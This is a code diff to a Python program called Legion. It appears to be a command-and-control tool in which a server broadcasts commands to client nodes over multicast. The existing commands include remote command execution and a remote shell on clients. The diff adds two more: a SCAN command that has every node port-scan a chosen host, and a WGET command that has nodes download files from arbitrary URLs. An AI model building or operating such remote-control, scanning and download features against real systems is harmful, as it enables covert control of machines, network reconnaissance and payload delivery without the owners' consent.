@@ -20,6 +20,7 @@ from multiprocessing import Process, Manager
 from utils import Utils
 from node import Node
 from splitjobs import Split
+from portscan import Scanner
 
 class Legion():
     def __init__(self, ip, port, mcastChannel="234.233.232.231", mcastPort=8193):
@@ -188,8 +189,20 @@ class Legion():
         if (msg.startswith("EXIT")):
             sys.stdout.write("Client Terminated!!!\r\n")
             self.cleanup()
-        elif (msg.startswith("KILL")):
-            self.cleanup()
+        elif (msg.startswith("SCAN")):
+            p = re.compile("SCAN:(.+?):(.+?):(.+)")
+            m = p.match(msg)
+            if (m):
+                print("Scanning: " + m.group(1) + "  " + m.group(2) + "-" + m.group(3))
+                self.outputBuf += '\r\n'.join(str(x) for x in Scanner.scan(m.group(1), range(int(m.group(2)), int(m.group(3)))))
+                print ("finished")
+                print (self.outputBuf)
+        elif (msg.startswith("WGET")):
+            p = re.compile("WGET\s+(.+)")
+            m = p.match(msg)
+            if (m):
+                print("Getting: " + m.group(1))
+                Utils.wget(m.group(1))
         elif (msg.startswith("EXEC")):
             p = re.compile("EXEC\s+(.+)")
             m = p.match(msg)
@@ -390,6 +403,12 @@ class Legion():
             if (m):
                 Comms.broadcast(slist, ignore_list, msg)
             displayPrompt = True
+        elif (msg.startswith("SCAN")):
+            Comms.broadcast(slist, ignore_list, msg)
+            displayPrompt = True
+        elif (msg.startswith("WGET")):
+            Comms.broadcast(slist, ignore_list, msg)
+            displayPrompt = True
         elif (msg.startswith("EXEC")):
             Comms.broadcast(slist, ignore_list, msg)
             displayPrompt = True
@@ -410,6 +429,8 @@ class Legion():
             displayPrompt = False
         elif (msg.startswith("EXIT")):
             Comms.broadcast(slist, ignore_list, msg)
+            displayPrompt = True 
+        elif (msg.startswith("QUIT")):
             self.cleanup()
         elif (msg.startswith("PROCLIST")):
             Comms.broadcast(slist, ignore_list, msg)
@@ -647,7 +668,10 @@ def getHelp():
     tmp += "SHELL:#                       opens remote shell on client #\r\n"
     tmp += "NODE:# <cmd>                  issues another command only to node #\r\n"
     tmp += "MESH:# <cmd>                  send message/cmd to remote node\r\n"
-    tmp += "EXIT                          EXITS server and shuts own the nodes too\r\n"
+    tmp += "SCAN:<ip>:<start port>:<stop port>    perform port scan\r\n"
+    tmp += "WGET <url>                    download file from URL\r\n"
+    tmp += "EXIT                          shut down the nodes\r\n"
+    tmp += "QUIT                          EXITS server\r\n"
     tmp += "\r\n"
     return tmp
 
